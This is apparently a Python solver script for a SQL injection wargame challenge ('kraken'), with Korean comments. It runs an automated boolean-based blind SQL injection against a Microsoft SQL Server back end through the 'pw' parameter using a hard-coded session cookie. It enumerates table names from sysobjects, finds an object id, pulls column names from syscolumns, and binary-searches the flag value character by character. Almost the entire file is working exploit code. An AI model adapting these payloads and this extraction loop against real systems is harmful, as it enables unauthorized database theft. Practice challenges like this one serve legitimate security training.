import string
import requests

url = "https://los.rubiya.kr/chall/kraken_647f3513b94339a4c59cf6f9074d0f92.php"
params = {"pw" : None}
cookies = {"PHPSESSID" : "qp6b7g99hjr3amos0h8f72npl5"}

# 비밀번호 테이블들 출력
table_list = []
for i in range(2,3):
    table_name = ''
    for j in range(1,20):
        for k in string.printable:
            if(k == string.printable[-1]):
                print("finish table_name",table_name)
                table_list.append(table_name)
                break
            payload ="""' or {}=(select top 1 ascii(substring(name,{},1)) from (select top {} name from .dbo.sysobjects where xtype='u' order by name asc) as t order by name desc)-- -""".format(ord(k),j,i)
            print(payload)
            params["pw"] = payload
            response = requests.get(url,params=params,cookies=cookies)
            if("guest" in response.text):
                table_name += k
                print("find the {}st table_name : {}".format(i,table_name))
                break

#첫번째 테이블은 더미 테이블이고, 두번째가 진짜
# 테이블 길이는 몇글자인지 모르니까  일단 크게 잡고 반복문 조건으로 끝낸다.
# 탐색은 이진 탐색
table_name = ''
for i in range(1,40):
    start,end = 0,255
    while True:
        search = int((start + end)/2)
        if(search == 254):
            break
        payload ="""' or (select top 1 ascii(substring(name,{},1)) from (select top 2 name from .dbo.sysobjects where xtype='u' order by name asc) as t order by name desc)<={}-- -""".format(i,search)
        print(payload)
        params["pw"] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("guest" in response.text):
            payload ="""' or (select top 1 ascii(substring(name,{},1)) from (select top 2 name from .dbo.sysobjects where xtype='u' order by name asc) as t order by name desc)={}-- -""".format(i,search)
            print(payload)
            params["pw"] = payload
            response = requests.get(url,params=params,cookies=cookies)
            if("guest" in response.text):
                table_name += chr(search)
                print("find the table_name",table_name)
                break
            end = search
        else:
            start = search
    if(search == 254):
        print("finish searching table_name")
        break



# SQL Server Blind sql injection 순서
# 1. DB명 구하기
# select name from .dbo.sysobjects;
# 2. DB ID 구하기 (.dbo.syscolumns 에는 name 컬럼이 없어서 id 컬럼으로 테이블을 특정지을 수 있다.)
# select id from .dbo.sysobjects where name =  
# 3. 컬럼 명 구하기
table_name = 'flag_ccdfe62b'

# DBID
table_name = 'flag_ccdfe62b'
start,end = 0 , 2**32
while True:
    search = int((start + end)/2)
    payload ="""' or (select id from .dbo.sysobjects where name='flag_ccdfe62b')<={}-- -""".format(search)
    print(payload)
    params["pw"] = payload
    response = requests.get(url,params=params,cookies=cookies)
    if("guest" in response.text):
        payload ="""' or (select id from .dbo.sysobjects where name='flag_ccdfe62b')={}-- -""".format(search)
        print(payload)
        params["pw"] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("guest" in response.text):
            print("find the db_id",search)
            break
        end = search
    else:
        start = search

table_name = 'flag_ccdfe62b'
db_id =  901578250

# 컬럼 명 구하기
column_name = ''
for i in range(1,40):
    start,end = 0,255
    while True:
        search = int((start + end)/2)
        if(search == 254):
            break
        payload ="""' or (select top 1 ascii(substring(name,{},1)) from (select top 1 name from .dbo.syscolumns where id=901578250 order by name asc) as t order by name desc)<={}-- -""".format(i,search)
        print(payload)
        params["pw"] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("guest" in response.text):
            payload ="""' or (select top 1 ascii(substring(name,{},1)) from (select top 1 name from .dbo.syscolumns where id=901578250 order by name asc) as t order by name desc)={}-- -""".format(i,search)
            print(payload)
            params["pw"] = payload
            response = requests.get(url,params=params,cookies=cookies)
            if("guest" in response.text):
                column_name += chr(search)
                print("find the column_name",column_name)
                break
            end = search
        else:
            start = search
    if(search == 254):
        print("finish searching column_name")
        break

# flag 구하기
table_name = 'flag_ccdfe62b'
column_name = 'flag_ab15b600'
flag = ''
for i in range(1,40):
    start,end = 0,255
    while True:
        search = int((start + end)/2)
        if(search == 254):
            break
        payload ="""' or (select top 1 ascii(substring(flag_ab15b600,{},1)) from (select top 1 flag_ab15b600 from flag_ccdfe62b order by flag_ab15b600 asc) as t order by flag_ab15b600 desc)<={}-- -""".format(i,search)
        print(payload)
        params["pw"] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("guest" in response.text):
            payload ="""' or (select top 1 ascii(substring(flag_ab15b600,{},1)) from (select top 1 flag_ab15b600 from flag_ccdfe62b order by flag_ab15b600 asc) as t order by flag_ab15b600 desc)={}-- -""".format(i,search)
            print(payload)
            params["pw"] = payload
            response = requests.get(url,params=params,cookies=cookies)
            if("guest" in response.text):
                flag += chr(search)
                print("find the flag",flag)
                break
            end = search
        else:
            start = search
    if(search == 254):
        print("finish searching flag : ", flag)
        break